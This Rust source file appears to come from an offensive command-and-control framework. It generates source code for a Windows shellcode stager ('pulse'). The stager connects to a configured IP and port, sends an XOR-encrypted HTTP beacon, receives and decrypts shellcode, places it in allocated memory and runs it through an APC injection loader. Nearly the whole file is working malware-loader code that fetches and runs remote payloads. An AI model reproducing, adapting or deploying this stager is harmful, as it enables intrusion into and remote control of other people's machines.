use crate::{win::PANIC, GenerateArch, HttpHeader, Pulse, Version};

use super::{djb2_hash, utils::{TARGET_SOURCE_PATH, X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY}};

static X64_DEPENDENCIES: &str = "
use malefic_win_kit::asm::arch::x64::{
    crypto::xor_process,
    apc::inline_apc_loader, 
    http::make_http, 
    memory::{
        _convert_lebytes_to_u32, 
        _memcpy, 
        _memset, 
        _virtual_alloc
    }, 
    str::boyer_moore_search, 
    tcp::{
        bind_and_connect, 
        send_std, 
        recv_std
        }
    };
";

static X86_DEPENDENCIES: &str = "
use malefic_win_kit::asm::arch::x86::{
    crypto::xor_process,
    apc::inline_apc_loader, 
    http::make_http, 
    memory::{
        _convert_lebytes_to_u32, 
        _memcpy, 
        _memset, 
        _virtual_alloc
    }, 
    str::boyer_moore_search, 
    tcp::{
        bind_and_connect, 
        send_std, 
        recv_std
        }
    };
";

static PREBUILD_DEPENDENCIES: &str = r#"
#[link(name = "malefic_win_kit_pulse", kind = "static")]
extern "C" {
    pub fn bind_and_connect(
        dll_name: *const u8, 
        ip: *const u8, 
        port: u16
    ) -> usize;
    pub fn send_std(
        socket: usize,
        buf: usize,
        len: usize 
    ) -> usize;
    pub fn recv_std(
        socket: usize,
        buf: usize,
        len: usize,
    ) -> usize;
    pub fn xor_process(
        data: *mut u8, 
        data_len: usize, 
        key: *const u8, 
        key_len: usize, 
        iv: *const u8, 
        iv_len: usize, 
        counter: *mut usize
    );
    pub fn _virtual_alloc(
        _address: *mut u8,
        _size: usize,
        _alloc_type: u32,
        _protect: u32
    ) -> *mut u8;
    pub fn _memcpy(
        _dst: *mut u8,
        _src: *const u8,
        _size: usize,
    );
    pub fn _memset(
        _dst: *mut u8,
        _value: u8,
        _size: usize,
    );
    pub fn _convert_lebytes_to_u32(
        _bytes: *const u8,
    ) -> u32;
    pub fn inline_apc_loader(bin: usize, len: usize) -> usize;
    pub fn make_http(
        header: *const u8,
        header_len: usize,
        body: *const u8,
        body_len: usize,
        buf: *mut u8,
        buf_len: usize,
    );
}
"#;

pub fn generate_http_header(config: &Pulse) -> String{
    let http_header = config.http.clone();
    let mut http_request = format!(
        "{} {} HTTP/{}\r\n",
        http_header.method, http_header.path, http_header.version
    );
    
    http_request.push_str(&format!("Host: {}\r\n", config.target));
    http_request.push_str("Content-Length: 10\r\n");
    http_request.push_str("Connection: close\r\n");
    for (key, value) in http_header.headers.clone() {
        http_request.push_str(&format!("{}: {}\r\n", key, value));
    }

    http_request.push_str("\r\n");

    http_request.to_string()
}

pub fn generate_http_pulse(
    config: Pulse,
    arch: GenerateArch,
    version: &Version,
    source: bool,
) -> anyhow::Result<()> {
    generate_pulse_template(config, arch, version, source)
}

fn generate_pulse_template(
    config: Pulse,
    arch: GenerateArch,
    version: &Version,
    source: bool,
) -> anyhow::Result<()> {
    let mut dependencies = PREBUILD_DEPENDENCIES;
    let main_template_path;
    let make_body;
    match arch {
        GenerateArch::X64 => {
            if source {
                dependencies = X64_DEPENDENCIES;
            }
            main_template_path = X64_MAIN_TEMPLATE_PATH;
            make_body = X64_MAKE_BODY;
        }
        GenerateArch::X86 => {
            if source {
                dependencies = X86_DEPENDENCIES;
            }
            main_template_path = X86_MAIN_TEMPLATE_PATH;
            make_body = X86_MAKE_BODY;
        }
        // _ => {
        //     anyhow::bail!("Unsupported arch.");
        // }
    }

    make_source_code(
        config,
        main_template_path,
        dependencies,
        TARGET_SOURCE_PATH,
        make_body,
        version,
        source
    )
}

fn make_source_code(
    config: Pulse,
    main_template_path: &str,
    dependencies: &str,
    _target_source_path: &str,
    make_body: &str,
    _version: &Version,
    source: bool,
) -> anyhow::Result<()> {
    let main_template_path = std::path::Path::new(main_template_path);
    if !main_template_path.exists() {
        anyhow::bail!("main_template_path does not exist.");
    }
    let main_template = std::fs::read_to_string(main_template_path)?;
    let mut final_data = format!("{}\n\n\n{}\n", main_template, dependencies);
    
    if !source {
        final_data = format!("{}\n\n\n{}\n", final_data, PANIC);
    }

    final_data = format!("{}\n\n\n{}", final_data, make_body);
    let url = &config.target;
    if url.is_empty() {
        anyhow::bail!("url is empty.");
    }
    let (ip, port) = url.split_at(url.find(":").unwrap());
    let http_header = generate_http_header(&config);
    let magic = djb2_hash(&config.flags.magic);
    let key = &config.key;
    let iv = key.chars().rev().collect::<String>();

    let main_content = format!(
        r#"
#[no_mangle]
fn fire() {{
    let start = {start}u8;
    let end = {end}u8;
    let magic = {magic}u32;
    let header = b"{http_header}";
    unsafe {{
        let mut buf: [u8;0x100] = 
            core::mem::MaybeUninit::uninit().assume_init();
        let mut body_buf: [u8;10] = 
            core::mem::MaybeUninit::uninit().assume_init();
        _memset(buf.as_mut_ptr(), 0, 0x100);
        _memset(body_buf.as_mut_ptr(), 0, 10);
        let socket = bind_and_connect(
            "ws2_32.dll\x00".as_ptr(), 
            "{ip}\x00".as_ptr(), 
            {port}
        );
        if socket.eq(&0) {{
            return;
        }}
        make_body(body_buf.as_mut_ptr(), start, end, magic, {artifact_id});
        let mut counter: usize = 0;
        xor_process(
            body_buf.as_mut_ptr(),
            10,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        make_http(
            header.as_ptr(), 
            header.len(), 
            body_buf.as_mut_ptr(), 
            10, 
            buf.as_mut_ptr(), 
            0x100);
        let ret = send_std(socket, buf.as_ptr() as _, 0x100);
        if ret.eq(&0) {{
            return;
        }}
        let split_marker = b"\r\n\r\n";
        _memset(buf.as_mut_ptr(), 0, 0x100);
        let mut body_offset: isize = -1;
        let mut offset: usize = 0;

        loop {{
            let ret = recv_std(
                socket,
                buf.as_ptr().add(0x4) as usize,
                0x100 - 0x4
            );
            if ret.eq(&0) || ret.eq(&0xffffffff) {{
                return;
            }}
            offset += ret as usize + 4;
            body_offset = boyer_moore_search(
                buf.as_mut_ptr(), 
                0x100, 
                split_marker.as_ptr(), 
                split_marker.len()
            );
            if body_offset.ne(&-1) {{
                break;
            }}
            _memset(buf.as_mut_ptr(), 0, 0x100 - 0x4);
            if offset.eq(&0x100) {{
                _memcpy(buf.as_mut_ptr(), buf.as_ptr().add(ret as usize), 4);
            }}
        }}

        _memset(body_buf.as_mut_ptr(), 0, 10);
        let body_offset = 4 + body_offset as usize;
        if (body_offset + 9).le(&offset) {{
            _memcpy(body_buf.as_mut_ptr(), buf.as_ptr().add(body_offset), 9);
        }} else {{
            let left_data = body_offset + 9 - offset;
            let additional_ret = recv_std(
                socket, 
                body_buf.as_mut_ptr() as _, 
                left_data);
            if additional_ret.eq(&0) || additional_ret.eq(&0xffffffff) {{
                return;
            }}
        }}
        counter = 0;
        xor_process(
            body_buf.as_mut_ptr(),
            9,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        if body_buf[0].ne(&start) {{
            return;
        }}
        let recv_magic = _convert_lebytes_to_u32(body_buf.as_ptr().add(1));
        let recv_len = _convert_lebytes_to_u32(body_buf.as_ptr().add(5));
        if recv_magic.ne(&magic) || recv_len.eq(&0) {{
            return;
        }}
        let ptr = _virtual_alloc(0 as _, recv_len as _, 0x1000, 0x4);
        if ptr.is_null() {{
            return;
        }}
        let mut shellcode_len = 0;
        if body_offset + 9 <= offset {{
            shellcode_len = offset - body_offset - 9;
        }}
        if shellcode_len > 0 {{
            _memcpy(
                ptr as _, 
                buf.as_ptr().add(body_offset + 9), 
                shellcode_len
            );
        }}
        while shellcode_len < recv_len as usize {{
            let ret = recv_std(
                socket, 
                ptr as usize + shellcode_len, 
                recv_len as usize - shellcode_len
            );
            if ret == 0 || ret == 0xffffffff {{
                return;
            }}
            shellcode_len += ret as usize;
        }}
        xor_process(
            ptr as _,
            shellcode_len as _,
            "{key}".as_ptr(),
            {key_len},
            "{iv}".as_ptr(),
            {iv_len},
            &mut counter
        );
        inline_apc_loader(ptr as _, shellcode_len);
    }}
}}
        "#,
        start = config.flags.start,
        end = config.flags.end,
        magic = format!("0x{:x}", magic as u32),
        artifact_id = config.flags.artifact_id,
        ip = ip,
        port = port[1..].parse::<u16>()?,
        key = key,
        key_len = key.len(),
        iv = iv,
        iv_len = iv.len(),
    );
    final_data = format!("{}\n\n\n{}", final_data, main_content);
    let target_path = std::path::Path::new(TARGET_SOURCE_PATH);
    std::fs::write(target_path, final_data)?;

    Ok(())
}